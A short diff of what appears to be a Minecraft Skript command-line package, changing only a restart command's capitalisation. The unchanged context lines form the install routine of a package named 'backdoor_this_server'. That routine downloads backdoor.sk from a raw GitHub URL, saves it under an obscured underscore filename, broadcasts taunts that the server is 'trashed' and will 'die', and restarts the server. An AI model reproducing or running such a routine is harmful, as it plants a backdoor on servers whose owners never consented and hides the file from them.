@@ -14,7 +14,7 @@ $snd "&4YOUR SERVER HAS BEEN TRASHED!"
 $dl https://raw.githubusercontent.com/Domracz/SkriptCommandLine/main/cmdcode/packages/backdoor_this_server/backdoor.sk -> _____________________.sk
 $snd "&4HAHAHHA! THE BACKDOOR DOWNLOAD HAS BEEN COMPLETED! now... TIME FOR YOUR SERVER TO DIE!"
 $snd "&4I'M GOING TO RESTART YOUR SERVER NOW!"
-$Server.restart
+$server.restart
 @PACKAGE INSTALL END
 @PACKAGE UNINSTALL STR
 $snd "&4I have no idea how the heck you ran this command, but still. There isnt an installer for this backdoor! BACKDOOR.SK ON TOP!"
